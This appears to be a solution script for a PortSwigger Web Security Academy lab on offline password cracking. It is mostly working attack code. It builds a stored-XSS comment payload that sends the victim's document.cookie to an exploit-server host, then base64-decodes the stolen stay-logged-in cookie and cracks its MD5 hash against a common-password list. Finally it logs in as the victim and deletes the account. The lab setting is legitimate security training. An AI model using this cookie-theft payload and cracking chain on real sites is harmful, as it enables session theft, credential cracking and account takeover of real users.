# Lab 10 — Offline password cracking
# PortSwigger: https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking
#
# Vulnerability: Stored XSS in blog comments + the same insecure
#                base64(username:MD5(password)) stay-logged-in cookie as Lab 09
# Aim:           Steal carlos's cookie via XSS, crack the hash, delete his account
#
# Technique:
#   Stage 1: Post an XSS payload as a blog comment that exfiltrates
#            document.cookie to the exploit server when carlos views the post.
#   Stage 2: Decode the leaked stay-logged-in cookie, extract the MD5 hash.
#   Stage 3: Crack the hash — either via a local wordlist (as this script
#            does) or an online lookup service like crackstation.net.
#   Stage 4: Log in as carlos with the cracked password, delete the account.
#
#   Stages 1 (delivery) and its trigger (carlos viewing the post) cannot be
#   automated with requests — they require the exploit server and the lab's
#   simulated victim. This script builds the payload, then automates the
#   offline cracking and final takeover once you have the leaked cookie.
#
# Usage: python authentication_lab10.py <url> [leaked_cookie_value]
#   Run once with no cookie to get the XSS payload to deliver.
#   Run again with the leaked cookie value (from the exploit server access
#   log) to crack it and complete the takeover.

import sys
import hashlib
import base64
import urllib3
from proxies import proxies
from authentication_utils import (banner, section, make_session, login,
                                   get_csrf_from_response, load_wordlist,
                                   check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

COMMON_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345",
    "1234", "111111", "1234567", "dragon", "123123", "baseball",
    "abc123", "football", "monkey", "letmein", "shadow", "master",
    "666666", "qwertyuiop", "123321", "mustang", "1234567890",
    "michael", "654321", "superman", "1qaz2wsx", "7777777",
    "121212", "000000", "onceuponatime", "montoya", "solo", "starwars",
]


def build_xss_exploit(exploit_server_domain):
    return f"""\
<script>document.location='https://{exploit_server_domain}/'+document.cookie</script>"""


def crack_cookie(leaked_cookie_value, wordlist=None):
    """
    Decode a leaked stay-logged-in cookie and try to crack the MD5 hash
    against a wordlist (default: a small built-in common-password list).
    """
    try:
        decoded = base64.b64decode(leaked_cookie_value).decode()
    except Exception:
        print("  ✘  Could not base64-decode the provided cookie value")
        return None, None

    if ":" not in decoded:
        print(f"  ✘  Decoded value doesn't match username:hash format: {decoded}")
        return None, None

    username, target_hash = decoded.split(":", 1)
    print(f"  ✔  Decoded cookie: {decoded}")
    print(f"     Username : {username}")
    print(f"     MD5 hash : {target_hash}\n")

    candidates = wordlist if wordlist else COMMON_PASSWORDS
    print(f"  ➜  Cracking against {len(candidates)} candidate passwords...\n")

    for candidate in candidates:
        if hashlib.md5(candidate.encode()).hexdigest() == target_hash:
            print(f"  ✔  Hash cracked: {candidate!r}")
            return username, candidate

    print("  ✘  Hash not found in wordlist — try crackstation.net manually,")
    print(f"     or pass a larger wordlist file as a third argument.")
    return username, None


if __name__ == "__main__":
    banner()
    section("LAB 10 — OFFLINE PASSWORD CRACKING (XSS + INSECURE COOKIE)")

    if len(sys.argv) < 2:
        print("  Usage: python authentication_lab10.py <url> [leaked_cookie_value] [wordlist_file]")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if len(sys.argv) == 2:
        # ── Mode 1: build and print the XSS delivery payload ────────────────
        section("Mode 1: Build the XSS cookie-theft payload")

        if not login(session, url):
            sys.exit(1)

        exploit = build_xss_exploit("YOUR-EXPLOIT-SERVER-ID.exploit-server.net")
        print_box("BLOG COMMENT PAYLOAD", exploit)

        print("  ➜  Steps:")
        print("     1. Update the exploit-server domain in the payload above")
        print("     2. Post this as a comment on any blog post")
        print("     3. Wait for carlos (simulated victim) to view the post")
        print("     4. Check the exploit server's access log — carlos's full")
        print("        document.cookie string will appear in the request path")
        print("     5. Extract the 'stay-logged-in=' value from the leaked cookie")
        print("     6. Re-run this script:")
        print(f"        python authentication_lab10.py {url} <leaked_cookie_value>")
        sys.exit(0)

    # ── Mode 2: crack the leaked cookie and complete the takeover ────────────
    leaked_cookie = sys.argv[2]
    wordlist_file = sys.argv[3] if len(sys.argv) > 3 else None

    section("Mode 2: Crack the leaked cookie and take over the account")

    wordlist = load_wordlist(wordlist_file) if wordlist_file else None
    username, password = crack_cookie(leaked_cookie, wordlist)

    if not password:
        sys.exit(1)

    print_box("CRACKED CREDENTIALS", f"Username: {username}\nPassword: {password}")

    # ── Step: log in and delete the account ───────────────────────────────────
    print("  ── Logging in and deleting the account\n")
    take_session = make_session(proxies)
    if not login(take_session, url, username=username, password=password):
        print("  ✘  Login failed with cracked credentials")
        sys.exit(1)

    account_page = take_session.get(f"{url}/my-account")
    csrf = get_csrf_from_response(account_page.text)
    delete_data = {"csrf": csrf} if csrf else {}

    r_delete = take_session.post(f"{url}/my-account/delete", data=delete_data)
    check_status(r_delete, [200, 302], "Delete account")

    print()
    print("  ℹ  This exploit chains XSS (delivery mechanism) with an insecure")
    print("     cookie design (the actual crackable target) — neither alone")
    print("     would have been sufficient for full account takeover.")
